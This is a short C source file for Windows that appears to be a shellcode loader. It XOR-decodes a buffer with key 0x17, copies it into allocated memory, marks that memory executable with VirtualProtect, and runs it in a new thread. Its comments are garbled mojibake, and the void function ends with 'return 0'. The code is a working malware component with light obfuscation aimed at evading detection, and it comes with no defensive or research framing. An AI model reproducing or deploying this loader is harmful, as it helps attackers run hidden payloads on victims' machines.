#define _CRT_SECURE_NO_WARNINGS
#include "head.h"
#include <Windows.h>


void load_shellcode(char* argc_buf, int argc_bufsize) {
 
    DWORD dwThreadId;	//�߳�Id
    HANDLE hThread;		//�߳̾��
    DWORD dwOldProtect;	//�ڴ�ҳ����
 
    for (int i = 0; i < argc_bufsize; i++)
    {
        argc_buf[i] ^= 0x17;
    }
    char* shellcode = (char*)VirtualAlloc(
        NULL,
        4096,
        MEM_COMMIT,
        PAGE_READWRITE  //ֻ����ɶ���д
    );
    if (shellcode) 
    {
        memcpy(shellcode, argc_buf, argc_bufsize); //��shellcode���Ƶ��ɶ���д���ڴ���
        VirtualProtect(shellcode, argc_bufsize, PAGE_EXECUTE, &dwOldProtect); //��������Ϊ��ִ��
        hThread = CreateThread(
            NULL, // ��ȫ������
            NULL, // ջ�Ĵ�С
            shellcode, // ����
            NULL, // ����
            NULL, // �̱߳�־
            &dwThreadId // �߳�ID
        );
        WaitForSingleObject(hThread, INFINITE);
    }
   
    return 0;
}
